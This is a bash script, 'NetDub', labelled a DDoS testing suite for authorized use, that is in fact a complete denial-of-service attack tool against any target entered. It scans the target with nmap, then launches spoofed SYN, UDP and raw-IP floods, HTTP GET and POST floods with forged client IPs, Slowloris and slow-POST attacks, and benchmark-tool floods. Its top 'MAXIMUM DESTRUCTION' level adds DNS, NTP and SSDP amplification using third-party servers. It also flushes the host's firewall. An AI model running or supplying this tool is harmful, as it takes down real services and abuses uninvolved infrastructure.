#!/bin/bash

# NetDub - Advanced DDoS Testing Suite
# ⚠️ FOR AUTHORIZED TESTING ONLY ⚠️
# Requires: root privileges, Linux system

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Check root privileges
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] This script must be run as root${NC}"
   exit 1
fi

# Banner
echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║                    NETDUB - DDOS TESTING SUITE                ║${NC}"
echo -e "${RED}║                      FINAL STRESS TEST                        ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
echo -e "${YELLOW}⚠️  AUTHORIZED TESTING ONLY - FOR SECURITY RESEARCH  ⚠️${NC}"
echo

# Global variables
TARGET=""
TARGET_IP=""
TARGET_PORT=80
INTENSITY=1
DURATION=60
THREADS=1000

# Install dependencies
install_deps() {
    echo -e "${CYAN}[*] Installing dependencies...${NC}"
    
    # Update system
    apt-get update -qq
    
    # Install required packages
    apt-get install -y hping3 nmap masscan scapy python3-pip curl wget git bc \
                       net-tools iproute2 iptables tcpdump wireshark-common \
                       stress-ng siege apache2-utils wrk hey golang-go \
                       python3-scapy python3-requests python3-colorama \
                       python3-threading python3-socket > /dev/null 2>&1
    
    # Install Python packages
    pip3 install scapy requests colorama threading > /dev/null 2>&1
    
    # Install custom tools
    if [ ! -f "/usr/local/bin/slowhttptest" ]; then
        wget -q https://github.com/shekyan/slowhttptest/archive/master.zip
        unzip -q master.zip
        cd slowhttptest-master
        ./configure --prefix=/usr/local && make && make install
        cd .. && rm -rf slowhttptest-master master.zip
    fi
    
    echo -e "${GREEN}[✓] Dependencies installed${NC}"
}

# Network optimization for maximum performance
optimize_network() {
    echo -e "${CYAN}[*] Optimizing network for maximum performance...${NC}"
    
    # Increase system limits
    echo "1048576" > /proc/sys/net/core/rmem_max
    echo "1048576" > /proc/sys/net/core/wmem_max
    echo "1048576" > /proc/sys/net/core/rmem_default
    echo "1048576" > /proc/sys/net/core/wmem_default
    echo "262144" > /proc/sys/net/core/netdev_max_backlog
    echo "30000" > /proc/sys/net/core/somaxconn
    
    # TCP optimization
    echo "1" > /proc/sys/net/ipv4/tcp_tw_reuse
    echo "1" > /proc/sys/net/ipv4/tcp_tw_recycle
    echo "5" > /proc/sys/net/ipv4/tcp_fin_timeout
    echo "1024 65535" > /proc/sys/net/ipv4/ip_local_port_range
    echo "0" > /proc/sys/net/ipv4/tcp_slow_start_after_idle
    
    # Increase file descriptors
    ulimit -n 1048576
    echo "* soft nofile 1048576" >> /etc/security/limits.conf
    echo "* hard nofile 1048576" >> /etc/security/limits.conf
    
    # Disable firewall temporarily
    systemctl stop ufw 2>/dev/null
    iptables -F
    iptables -X
    iptables -t nat -F
    iptables -t nat -X
    
    echo -e "${GREEN}[✓] Network optimized for maximum performance${NC}"
}

# Target reconnaissance
target_recon() {
    echo -e "${CYAN}[*] Target reconnaissance: $TARGET${NC}"
    
    # Resolve target IP
    TARGET_IP=$(dig +short $TARGET | head -n1)
    if [ -z "$TARGET_IP" ]; then
        echo -e "${RED}[!] Unable to resolve target${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[✓] Target IP: $TARGET_IP${NC}"
    
    # Port scan
    echo -e "${CYAN}[*] Scanning common ports...${NC}"
    nmap -T5 -sS -O --top-ports 100 $TARGET_IP | grep -E "open|filtered" | head -10
    
    # Service detection
    echo -e "${CYAN}[*] Service detection...${NC}"
    nmap -sV -O $TARGET_IP -p 80,443,8080,8443 | grep -E "PORT|open"
    
    # WAF detection
    echo -e "${CYAN}[*] WAF detection...${NC}"
    curl -s -I -H "User-Agent: ' OR 1=1--" http://$TARGET/ | grep -i "cloudflare\|server" || echo "No obvious WAF detected"
}

# Layer 3 - Network Layer Attack
layer3_attack() {
    echo -e "${RED}[*] Layer 3 Attack - IP Flood${NC}"
    
    # IP flood using hping3
    for i in $(seq 1 $THREADS); do
        hping3 -c 1000000 -d 1460 -S -w 64 -p $TARGET_PORT --flood --rand-source $TARGET_IP &
    done
    
    # Raw socket flood
    python3 -c "
import socket
import threading
import time
import random
import struct

def ip_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    while True:
        try:
            # Create raw IP packet
            src_ip = '.'.join([str(random.randint(1,254)) for _ in range(4)])
            packet = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 0, 0, 64, 6, 0, 
                               socket.inet_aton(src_ip), socket.inet_aton('$TARGET_IP'))
            sock.sendto(packet, ('$TARGET_IP', $TARGET_PORT))
        except:
            pass

for _ in range(100):
    threading.Thread(target=ip_flood).start()
" &
    
    echo -e "${GREEN}[✓] Layer 3 attack launched${NC}"
}

# Layer 4 - Transport Layer Attack
layer4_attack() {
    echo -e "${RED}[*] Layer 4 Attack - TCP/UDP Flood${NC}"
    
    # SYN flood
    for i in $(seq 1 $THREADS); do
        hping3 -c 1000000 -S -w 64 -p $TARGET_PORT --flood --rand-source $TARGET_IP &
    done
    
    # UDP flood
    for i in $(seq 1 $THREADS); do
        hping3 -c 1000000 -2 -w 64 -p $TARGET_PORT --flood --rand-source $TARGET_IP &
    done
    
    # TCP flood with random flags
    for i in $(seq 1 $THREADS); do
        hping3 -c 1000000 -F -P -U -w 64 -p $TARGET_PORT --flood --rand-source $TARGET_IP &
    done
    
    # Connection exhaustion
    python3 -c "
import socket
import threading
import time

def tcp_flood():
    while True:
        try:
            for port in range(80, 90):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                try:
                    sock.connect(('$TARGET_IP', port))
                    sock.send(b'GET / HTTP/1.1\r\nHost: $TARGET\r\n\r\n')
                    time.sleep(0.1)
                except:
                    pass
                finally:
                    sock.close()
        except:
            pass

for _ in range(200):
    threading.Thread(target=tcp_flood).start()
" &
    
    echo -e "${GREEN}[✓] Layer 4 attack launched${NC}"
}

# Layer 7 - Application Layer Attack
layer7_attack() {
    echo -e "${RED}[*] Layer 7 Attack - HTTP Flood${NC}"
    
    # HTTP GET flood
    for i in $(seq 1 $THREADS); do
        while true; do
            curl -s -H "User-Agent: Bot$i" -H "X-Forwarded-For: $(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1)" \
                 "http://$TARGET/?$(openssl rand -hex 16)" > /dev/null 2>&1
        done &
    done
    
    # HTTP POST flood
    for i in $(seq 1 $THREADS); do
        while true; do
            curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" \
                 -d "$(openssl rand -hex 1024)" "http://$TARGET/" > /dev/null 2>&1
        done &
    done
    
    # Slowloris attack
    python3 -c "
import socket
import threading
import time
import random

def slowloris():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect(('$TARGET_IP', $TARGET_PORT))
            
            sock.send(b'GET /?{} HTTP/1.1\r\n'.format(random.randint(0, 2000)).encode())
            sock.send(b'Host: $TARGET\r\n')
            sock.send(b'User-Agent: Mozilla/5.0\r\n')
            sock.send(b'Accept-language: en-US,en,q=0.5\r\n')
            
            while True:
                sock.send(b'X-a: {}\r\n'.format(random.randint(1, 5000)).encode())
                time.sleep(15)
        except:
            pass

for _ in range(500):
    threading.Thread(target=slowloris).start()
" &
    
    # Slow POST attack
    slowhttptest -c 500 -H -g -o /tmp/slow_post -i 10 -r 200 -t POST -u http://$TARGET/ &
    
    echo -e "${GREEN}[✓] Layer 7 attack launched${NC}"
}

# Advanced HTTP attacks
advanced_http_attack() {
    echo -e "${RED}[*] Advanced HTTP Attacks${NC}"
    
    # Apache Bench flood
    for i in $(seq 1 50); do
        ab -n 1000000 -c 1000 -r -k -H "User-Agent: LoadTest$i" http://$TARGET/ &
    done
    
    # Siege attack
    for i in $(seq 1 50); do
        siege -c 1000 -t 1H -b http://$TARGET/ &
    done
    
    # wrk attack
    for i in $(seq 1 20); do
        wrk -t 50 -c 1000 -d 1h --timeout 30s -H "User-Agent: wrk$i" http://$TARGET/ &
    done
    
    # Custom Python flood
    python3 -c "
import asyncio
import aiohttp
import random
import string

async def http_flood():
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                headers = {
                    'User-Agent': ''.join(random.choices(string.ascii_letters, k=20)),
                    'X-Forwarded-For': '{}.{}.{}.{}'.format(*[random.randint(1,255) for _ in range(4)]),
                    'X-Real-IP': '{}.{}.{}.{}'.format(*[random.randint(1,255) for _ in range(4)])
                }
                
                url = 'http://$TARGET/?{}'.format(''.join(random.choices(string.ascii_letters, k=16)))
                
                async with session.get(url, headers=headers, timeout=1) as response:
                    await response.read()
            except:
                pass

async def main():
    tasks = [http_flood() for _ in range(1000)]
    await asyncio.gather(*tasks)

asyncio.run(main())
" &
    
    echo -e "${GREEN}[✓] Advanced HTTP attacks launched${NC}"
}

# Amplification attacks
amplification_attack() {
    echo -e "${RED}[*] Amplification Attacks${NC}"
    
    # DNS amplification
    for i in $(seq 1 100); do
        hping3 -2 -c 1000000 -p 53 --spoof $TARGET_IP --flood 8.8.8.8 &
    done
    
    # NTP amplification
    for i in $(seq 1 100); do
        hping3 -2 -c 1000000 -p 123 --spoof $TARGET_IP --flood pool.ntp.org &
    done
    
    # SSDP amplification
    for i in $(seq 1 100); do
        hping3 -2 -c 1000000 -p 1900 --spoof $TARGET_IP --flood 239.255.255.250 &
    done
    
    echo -e "${GREEN}[✓] Amplification attacks launched${NC}"
}

# Monitor attack effectiveness
monitor_attack() {
    echo -e "${CYAN}[*] Monitoring attack effectiveness...${NC}"
    
    while true; do
        # Check target status
        STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 http://$TARGET/)
        
        if [ "$STATUS" = "000" ]; then
            echo -e "${RED}[!] Target appears DOWN (Connection timeout)${NC}"
        elif [ "$STATUS" = "522" ]; then
            echo -e "${YELLOW}[!] 522 Connection Timed Out (Cloudflare)${NC}"
        elif [ "$STATUS" = "503" ]; then
            echo -e "${YELLOW}[!] 503 Service Unavailable${NC}"
        elif [ "$STATUS" = "504" ]; then
            echo -e "${YELLOW}[!] 504 Gateway Timeout${NC}"
        else
            echo -e "${GREEN}[*] Target responding with code: $STATUS${NC}"
        fi
        
        # Network statistics
        PACKETS_SENT=$(cat /proc/net/snmp | grep "Tcp:" | tail -1 | awk '{print $12}')
        echo -e "${BLUE}[*] Packets sent: $PACKETS_SENT${NC}"
        
        # Process count
        PROCESS_COUNT=$(ps aux | grep -E "hping3|curl|python3" | grep -v grep | wc -l)
        echo -e "${BLUE}[*] Active attack processes: $PROCESS_COUNT${NC}"
        
        sleep 5
    done
}

# Cleanup function
cleanup() {
    echo -e "${CYAN}[*] Stopping all attacks...${NC}"
    
    # Kill all attack processes
    pkill -f hping3
    pkill -f curl
    pkill -f python3
    pkill -f ab
    pkill -f siege
    pkill -f wrk
    pkill -f slowhttptest
    
    # Reset network settings
    echo "65536" > /proc/sys/net/core/rmem_max
    echo "65536" > /proc/sys/net/core/wmem_max
    
    echo -e "${GREEN}[✓] Cleanup completed${NC}"
}

# Stress test levels
stress_level_1() {
    echo -e "${YELLOW}[*] Stress Level 1: Light Testing${NC}"
    THREADS=100
    layer7_attack
}

stress_level_2() {
    echo -e "${YELLOW}[*] Stress Level 2: Medium Testing${NC}"
    THREADS=500
    layer4_attack
    layer7_attack
}

stress_level_3() {
    echo -e "${YELLOW}[*] Stress Level 3: Heavy Testing${NC}"
    THREADS=1000
    layer3_attack
    layer4_attack
    layer7_attack
}

stress_level_4() {
    echo -e "${YELLOW}[*] Stress Level 4: Extreme Testing${NC}"
    THREADS=2000
    layer3_attack
    layer4_attack
    layer7_attack
    advanced_http_attack
}

stress_level_5() {
    echo -e "${RED}[*] Stress Level 5: MAXIMUM DESTRUCTION${NC}"
    THREADS=5000
    layer3_attack
    layer4_attack
    layer7_attack
    advanced_http_attack
    amplification_attack
}

# Main menu
main_menu() {
    echo -e "${WHITE}Select stress test level:${NC}"
    echo -e "${GREEN}1)${NC} Light Testing (100 threads)"
    echo -e "${GREEN}2)${NC} Medium Testing (500 threads)"
    echo -e "${GREEN}3)${NC} Heavy Testing (1000 threads)"
    echo -e "${GREEN}4)${NC} Extreme Testing (2000 threads)"
    echo -e "${RED}5)${NC} MAXIMUM DESTRUCTION (5000 threads)"
    echo -e "${CYAN}0)${NC} Exit"
    echo
    
    read -p "Enter choice [0-5]: " choice
    
    case $choice in
        1) stress_level_1 ;;
        2) stress_level_2 ;;
        3) stress_level_3 ;;
        4) stress_level_4 ;;
        5) stress_level_5 ;;
        0) exit 0 ;;
        *) echo -e "${RED}Invalid choice${NC}" && main_menu ;;
    esac
}

# Main execution
main() {
    # Get target
    read -p "Enter target domain/IP: " TARGET
    read -p "Enter target port (default 80): " TARGET_PORT
    TARGET_PORT=${TARGET_PORT:-80}
    
    # Install dependencies
    install_deps
    
    # Optimize network
    optimize_network
    
    # Target reconnaissance
    target_recon
    
    # Show menu
    main_menu
    
    # Start monitoring
    monitor_attack &
    MONITOR_PID=$!
    
    # Wait for user input to stop
    echo -e "${YELLOW}Press ENTER to stop the attack...${NC}"
    read
    
    # Cleanup
    kill $MONITOR_PID 2>/dev/null
    cleanup
}

# Signal handlers
trap cleanup EXIT INT TERM

# Run main function
main
